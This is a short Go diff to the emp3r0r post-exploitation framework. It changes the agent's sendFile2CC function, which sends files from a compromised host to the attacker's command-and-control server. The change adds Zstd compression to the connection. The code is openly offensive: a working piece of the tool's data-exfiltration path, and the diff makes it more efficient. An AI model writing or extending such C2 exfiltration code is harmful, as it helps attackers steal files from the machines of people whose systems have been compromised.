@@ -16,6 +16,7 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/mholt/archives"
 )
 
 // SmartDownload download via grab, if path is empty, return []byte instead
@@ -183,11 +184,18 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
 		return
 	}
-	// defer cancel()
 	defer conn.Close()
 
+	// open compressor
+	compressor, err := archives.Zstd{}.OpenWriter(conn)
+	if err != nil {
+		err = fmt.Errorf("sendFile2CC: failed to open compressor: %v", err)
+		return
+	}
+	defer compressor.Close()
+
 	freader := bufio.NewReader(f)
-	n, err := io.Copy(conn, freader)
+	n, err := io.Copy(compressor, freader)
 	if err != nil {
 		log.Printf("sendFile2CC failed, %d bytes transfered: %v", n, err)
 	}
